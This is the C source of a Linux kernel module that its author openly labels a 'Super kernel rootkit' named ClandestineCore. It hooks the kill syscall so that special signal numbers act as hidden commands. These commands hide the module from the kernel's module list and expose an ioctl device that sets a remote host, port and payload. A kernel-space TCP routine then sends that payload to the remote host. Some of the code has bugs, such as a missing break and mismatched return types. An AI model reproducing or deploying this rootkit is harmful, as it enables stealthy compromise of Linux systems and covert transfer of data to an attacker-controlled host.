#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/uaccess.h>

#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/file.h>

#include <linux/net.h>
#include <linux/in.h>
#include <net/sock.h>

#define SIGALWRECV 50
#define SIGREMRECV 51
#define SIGHIDEMOD 52
#define SIGUNHIDEM 53
#define SIGSENDNET 54

#define IOCTL_IP    0x100
#define IOCTL_PORT  0x200
#define IOCTL_DATA  0x300

#define DEVICE      "devcc"
#define IOCTL_BUFF_SIZE 1024 

struct ioctl_data {
    size_t size; 
    char buffer[IOCTL_BUFF_SIZE];
};

static int deviceUsed   = 0;
static int mode         = 0;
static char* rHost      = NULL;
static int rPort        = 0;
static char* payload    = NULL;

static struct list_head *save_previous_mod;
static int mod_hide     = 0;

static struct kprobe kp = {
    .symbol_name = "__x64_sys_kill",
};

static const struct file_operations fops = {
    .owner          = THIS_MODULE,
    .open           = misc_device_open,
    .release        = misc_device_release,
    .unlocked_ioctl = misc_device_ioctl,
};

static struct miscdevice misc_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name  = DEVICE,
    .fops  = &fops,
};

static int misc_device_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
    struct ioctl_data *greeting_var = kmalloc(sizeof(ioctl_data), GFP_KERNEL);
    switch (cmd) {
        case IOCTL_IP:
            if (copy_from_user(greeting_var, (struct ioctl_data __user *)arg, sizeof(struct ioctl_data))){
                kfree(greeting_var);
                return -EFAULT;
            }

            if (greeting_var->size > IOCTL_BUFF_SIZE) {
                kfree(greeting_var);
                return -EINVAL;
            }
            
            rHost = kmalloc(greeting_var->size, GFP_KERNEL);
            if (!rHost) {
                kfree(greeting_var);
                return -ENOMEM;
            }
            
            memcpy(rHost, greeting_var->buffer, greeting_var->size);
            break;
        case IOCTL_PORT:
            if (copy_from_user(&rPort, (int __user *)arg, sizeof(int))){
                kfree(greeting_var);
                return -EFAULT;
            }
            break;
        case IOCTL_DATA:
            if (copy_from_user(greeting_var, (struct ioctl_data __user *)arg, sizeof(struct ioctl_data))){
                kfree(greeting_var);
                return -EFAULT;
            }
            if (greeting_var->size > IOCTL_BUFF_SIZE) {
                kfree(greeting_var);
                return -EINVAL;
            }
            
            payload = kmalloc(greeting_var->size, GFP_KERNEL);
            if (!payload) {
                kfree(greeting_var);
                return -ENOMEM;
            }
            
            memcpy(payload, greeting_var->buffer, greeting_var->size);
        default:
            kfree(greeting_var);
            return -EINVAL;
    }

    kfree(greeting_var);
    return 0;
}

static int misc_device_open(struct inode *inode, struct file *file)
{
    if (deviceUsed)
        return -EBUSY;
    deviceUsed = 1;
    return 0;
}

static int misc_device_release(struct inode *inode, struct file *filp)
{
    deviceUsed = 0;
    return 0;
}

static int 
kSIGALWRECV(){
    return misc_register(&misc_device);
}
static void 
kSIGREMRECV(){
    misc_deregister(&misc_device);
}
static void
kSIGHIDEMOD(){
    save_previous_mod = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	mod_hide = 1;
}
static void
kSIGUNHIDEM(){
    list_add(&THIS_MODULE->list, save_previous_mod);
	mod_hide = 0;
}
static int 
kSIGSENDNET(){
    struct socket *sock;
    struct sockaddr_in saddr;
    struct msghdr msg;
    struct kvec vec;
    int ret;

    if (!rHost || rPort == 0 || !payload) {
        return;
    }

    ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        pr_err("Échec de la création du socket.\n");
        return;
    }

    memset(&saddr, 0, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(rPort);
    saddr.sin_addr.s_addr = in_aton(rHost);

    ret = sock->ops->connect(sock, (struct sockaddr *)&saddr, sizeof(saddr), 0);
    if (ret < 0) {
        pr_err("Échec de la connexion.\n");
        sock_release(sock);
        return;
    }

    vec.iov_base = payload;
    vec.iov_len = strlen(payload);

    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;

    ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
    if (ret < 0)
        pr_err("Échec de l'envoi du payload.\n");

    sock_release(sock);
}

static int 
SIGCATCH(struct kprobe *p, struct pt_regs *regs)
{
    int ret = 0;
    switch ((int)regs->si) {
        case SIGALWRECV:
            ret = kSIGALWRECV();
            break;
        case SIGREMRECV:
            kSIGREMRECV();
            break;
        case SIGHIDEMOD:
            kSIGHIDEMOD();
            break;
        case SIGUNHIDEM:
            kSIGUNHIDEM();
            break;
        case SIGSENDNET:
            kSIGSENDNET();
            break;
        default:
            break;
    }

    return ret;
}

static int __init ClandestineCore_init(void)
{
    kp.pre_handler = SIGCATCH;
    return register_kprobe(&kp);
}

static void __exit ClandestineCore_exit(void)
{
    kfree(rHost);
    kfree(payload);
    unregister_kprobe(&kp);
}

module_init(ClandestineCore_init);
module_exit(ClandestineCore_exit);
MODULE_LICENSE("GPL");

MODULE_AUTHOR("asbel");
MODULE_DESCRIPTION("Super kernel rootkit !");